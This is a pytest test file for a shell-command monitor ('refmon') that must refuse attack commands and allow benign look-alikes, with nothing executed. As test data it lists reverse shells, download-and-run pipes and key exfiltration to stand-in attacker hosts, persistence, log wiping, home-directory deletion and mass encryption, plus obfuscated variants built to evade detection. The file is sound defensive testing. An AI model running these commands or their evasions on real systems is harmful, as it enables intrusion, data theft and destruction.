"""The live barrier's command analysis (src/refmon/intent.py) and what the barrier decides with it.

Every command here is a harmless string: nothing is executed (`execute=False`). The attack strings
name behaviours (a shell bound to a socket, a startup-file write, a history wipe), and each comes
with benign look-alikes that must stay allowed, so a rule that only matches a word fails here.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from refmon.intent import analyze
from refmon.live import LiveBarrier

ATTACKS = {
    # name: (command, behaviour the analysis must name)
    "reverse shell via /dev/tcp": ("bash -i >& /dev/tcp/203.0.113.7/4444 0>&1", "network"),
    "reverse shell via nc -e": ("nc -e /bin/sh 203.0.113.7 4444", "network"),
    "socat exec shell": ("socat tcp-connect:203.0.113.7:4444 exec:/bin/sh", "network"),
    "python socket": (
        "python3 -c 'import socket;s=socket.socket();s.connect((\"203.0.113.7\",4444))'",
        "network",
    ),
    "download and run": (
        "curl -s http://dl.attacker.invalid/x -o /tmp/x && chmod +x /tmp/x",
        "network",
    ),
    "ssh key persistence": ("echo 'ssh-ed25519 AAAA x' >> ~/.ssh/authorized_keys", "persist"),
    "profile persistence": ("echo './agent &' >> ~/.bashrc", "persist"),
    "user systemd unit": ("systemctl --user enable evil.service", "persist"),
    "crontab from stdin": ("echo '* * * * * ./a' | crontab -", "persist"),
    "copy into autostart": ("cp agent.desktop ~/.config/autostart/", "persist"),
    "history wipe": ("history -c; unset HISTFILE", "tamper:logs"),
    "history truncate": ("truncate -s 0 ~/.bash_history", "tamper:logs"),
    "aws credentials": ("cat ~/.aws/credentials", "secret:secret"),
    "kube config": ("cp ~/.kube/config /tmp/k", "secret:secret"),
    "private key upload": (
        "curl -F f=@$HOME/.ssh/id_ed25519 http://drop.attacker.invalid/u",
        "secret:secret",
    ),
    "private key via scp": ("scp ~/.ssh/id_rsa user@203.0.113.7:", "secret:secret"),
    "preload from tmp": ("LD_PRELOAD=/tmp/hook.so ls", "preload"),
    "wipe home": ("rm -rf ~", "bulk"),
    "wipe home contents": ("rm -rf $HOME/*", "bulk"),
    "encrypt everything": (
        "find ~/data -type f -exec openssl enc -aes-256-cbc -in {} -out {}.e +",
        "bulk",
    ),
    "kill refmon by pid": ("kill -9 $(pgrep -f 'refmon serve')", "tamper:self"),
    "rewrite refmon policy": (
        "echo 'mode: observe' > /tmp/refmon-live-1000/policy.yaml",
        "tamper:self",
    ),
    "suid": ("chmod u+s ./helper", "privilege"),
}

BENIGN = [
    "ls -la",
    "git status",
    "pip install numpy",
    "python3 train.py --epochs 10",
    "sbatch job.sh",
    "squeue -u $USER",
    "module load gcc/12",
    "nvidia-smi",
    "history",
    "crontab -l",
    "cat ~/.bashrc",
    "cp ~/.bashrc ~/bashrc.bak",
    "cat ~/.ssh/id_ed25519.pub",
    "ssh -i ~/.ssh/id_ed25519 node042",
    "scp -i ~/.ssh/id_ed25519 results.csv node042:~/",
    "git clone git@git.example.org:org/repo.git",
    "LD_PRELOAD=libjemalloc.so ./app",
    "rm -rf build/",
    "find ~/scratch -name '*.tmp' -delete",
    "tar czf results.tgz results/",
    "systemctl --user status",
    "kill %1",
    "echo hello > out.txt",
]

# v2.0: the same behaviours with the word hidden by the shell's own means, and new behaviours.
# The first 20 were written before the v2.0 analyser (v1.7 refused 11), the last 20 after it and run
# once as a held-out check (v1.7 refused 13, v2.0 15, with one false alarm in its benign list) before
# the five misses and the false alarm were fixed; docs/v2.0-evaluation.md.
EVASIONS = [
    "cat ~/.a''ws/credentials",
    "cat ~/.aws/cred\\entials",
    "echo 'ssh-ed25519 AAAA x' >> ~/.ss''h/authorized_keys",
    "a=/dev/tc; b=p; bash -i >& $a$b/203.0.113.7/4444 0>&1",
    "x=.kube; cp ~/$x/config /tmp/k",
    "bash <(curl -s http://s.attacker.invalid/s)",
    "source <(wget -qO- http://s.attacker.invalid/s)",
    "curl -T ~/thesis.tar http://drop.attacker.invalid/",
    "tar czf - ~ | nc 203.0.113.7 9000",
    "echo './x &' > .git/hooks/post-checkout",
    "git config --global core.hooksPath ~/.hk",
    "docker run --privileged -v /:/host alpine sh",
    "ssh -fNR 9000:localhost:22 u@203.0.113.7",
    'rm -rf "$HOME"',
    "pkill -f refm''on",
    "$'\\x63\\x61\\x74' ~/.netrc",
    "c''url -s http://s.attacker.invalid/a | b''ash",
    "tar cz ~/ | curl -X POST --data-binary @- http://drop.attacker.invalid/u",
    "cat${IFS}~/.aws/credentials",
    "printf '%s' 'bHMK' | base64 -d | sh",
    # held-out
    "ca\\t ~/.git-credentials",
    "zsh -c 'zmodload zsh/net/tcp; ztcp 203.0.113.9 443'",
    "php -r '$s=fsockopen(\"203.0.113.9\",443);'",
    "awk 'BEGIN{s=\"/inet/tcp/0/203.0.113.9/443\"; print |& s}'",
    "echo '@reboot ./a' >> /var/spool/cron/crontabs/$USER",
    "cp ./a ~/.local/share/applications/x.desktop && cp ./a ~/.config/autostart/",
    "ln -s ./agent ~/.config/systemd/user/default.target.wants/a.service",
    "unset HISTFILE; export HISTSIZE=0",
    "cat /dev/null > ~/.zsh_history",
    "sudo -n true && sudo sh",
    "env LD_PRELOAD=/dev/shm/x.so /usr/bin/id",
    "find / -name '*.doc' -exec gpg --batch -c {} \\;",
    "rm -rf --no-preserve-root /",
    "killall -9 refmon",
    "openssl s_client -quiet -connect 203.0.113.9:443 | /bin/sh",
    "wget -q -O - http://s.attacker.invalid/i | sh -s",
    "curl -fsSL http://s.attacker.invalid/i -o- | python3 -",
    "B=bas;H=h; $B$H -c id",
    "cat ~/.ssh/id_ecdsa | nc 203.0.113.9 9",
    "rsync -a ~/ me@203.0.113.9:/srv/x",
]

BENIGN_V2 = [
    "cat ~/.aws/config.example",
    "git config --global user.name me",
    "docker run --rm -v $PWD:/w alpine ls /w",
    "ssh -L 8888:localhost:8888 node042",
    'rm -rf "$HOME/tmp/build"',
    "echo '' > empty.txt",
    "grep 'foo\\|bar' notes.txt",
    "printf 'a\\nb\\n'",
    "cat .git/hooks/pre-commit.sample",
    "$EDITOR notes.txt",
    'for f in *.csv; do wc -l "$f"; done',
    "tar czf ~/backup.tgz ~/project",
    "curl -O https://pypi.org/packages/x.whl",
    "ls ~/.ssh",
    # held-out
    "make -j8",
    "conda activate myenv",
    "srun --pty bash",
    "cat ~/.ssh/config",
    "ssh-keygen -t ed25519 -f ~/.ssh/id_new",
    "vim ~/.bashrc",
    "history | tail",
    "python3 -m http.server 8000 --bind 127.0.0.1",
    "rsync -a ~/project/ backup/",
    "docker run --rm -it ubuntu bash",
    "export PATH=$HOME/bin:$PATH",
    "openssl rand -hex 16",
    "zip -r results.zip results/",
    "kill -TERM $(pgrep -f train.py)",
    'echo "done at $(date)" >> log.txt',
]


@pytest.mark.parametrize("name", sorted(ATTACKS))
def test_each_attack_behaviour_is_named(name):
    command, behaviour = ATTACKS[name]
    assert behaviour in analyze(command).behaviours, (name, analyze(command))


@pytest.mark.parametrize("command", BENIGN)
def test_benign_look_alikes_name_no_behaviour(command):
    assert analyze(command).behaviours == [], analyze(command)


def test_hosts_and_paths_for_observe():
    it = analyze("bash -i >& /dev/tcp/203.0.113.7/4444 0>&1; curl https://a.example.org/p/q")
    assert set(it.hosts) == {"a.example.org", "203.0.113.7"}
    assert "/p/q" in it.url_paths
    assert analyze("nc -zv localhost 22").hosts == []  # loopback is not an outbound connection


@pytest.fixture(scope="module")
def barrier(tmp_path_factory) -> LiveBarrier:
    return LiveBarrier(workdir=tmp_path_factory.mktemp("intent-live"))


@pytest.mark.parametrize("name", sorted(ATTACKS))
def test_the_barrier_refuses_every_attack_even_typed_locally(barrier: LiveBarrier, name):
    """Typed by hand there is no origin label: at least a hold, which block mode refuses."""
    out = barrier.guard_command(ATTACKS[name][0], origin="none", execute=False)
    assert out.decision in ("hold", "block"), (name, out.signals)
    assert out.blocked_by_barrier and not out.executed


@pytest.mark.parametrize("name", sorted(ATTACKS))
def test_pasted_from_the_web_every_attack_is_blocked(barrier: LiveBarrier, name):
    out = barrier.guard_command(ATTACKS[name][0], origin="web", execute=False)
    assert out.decision == "block", (name, out.signals)


@pytest.mark.parametrize("command", BENIGN)
def test_benign_commands_typed_locally_are_allowed(barrier: LiveBarrier, command):
    assert barrier.guard_command(command, origin="none", execute=False).decision == "allow"


def test_nothing_raw_reaches_the_live_log(barrier: LiveBarrier):
    barrier.guard_command("cat ~/.aws/credentials", origin="none", execute=False)
    logged = Path(barrier.events_log_path).read_text(encoding="utf-8")
    assert ".aws/credentials" not in logged


@pytest.mark.parametrize("command", EVASIONS)
def test_v2_hidden_and_new_behaviours_are_refused_typed_locally(barrier: LiveBarrier, command):
    out = barrier.guard_command(command, origin="none", execute=False)
    assert out.decision in ("hold", "block"), (command, analyze(command))


@pytest.mark.parametrize("command", BENIGN_V2)
def test_v2_benign_look_alikes_stay_allowed(barrier: LiveBarrier, command):
    # a download from a trusted class is a network behaviour the policy allows
    assert set(analyze(command).behaviours) <= {"network"}, analyze(command)
    assert barrier.guard_command(command, origin="none", execute=False).decision == "allow"


@pytest.mark.parametrize(
    "hidden, plain",
    [
        ("c''url", "curl"),
        ("cred\\entials", "credentials"),
        ("cat${IFS}x", "cat x"),
        ("$'\\x63\\x61\\x74' f", "cat f"),
        ('rm -rf "$HOME"', "rm -rf $HOME"),
        ("a=/dev/tc; b=p; x $a$b/h", "a=/dev/tc; b=p; x /dev/tcp/h"),
    ],
)
def test_normalize_undoes_what_the_shell_undoes(hidden, plain):
    from refmon.intent import normalize

    assert normalize(hidden)[0] == plain


def test_hiding_a_word_is_itself_the_hide_behaviour():
    assert analyze("l''s").encoded
    assert not analyze("ls").encoded
    assert not analyze("printf 'a\\nb'").encoded  # an escape inside quotes hides nothing


def test_sending_the_home_directory_away_is_exfil_with_the_policy_volume(barrier: LiveBarrier):
    out = barrier.guard_command("tar czf - ~ | nc 203.0.113.7 9000", origin="none", execute=False)
    assert "effect_exfil" in out.signals
    assert not analyze("tar czf ~/backup.tgz ~/project").exfil
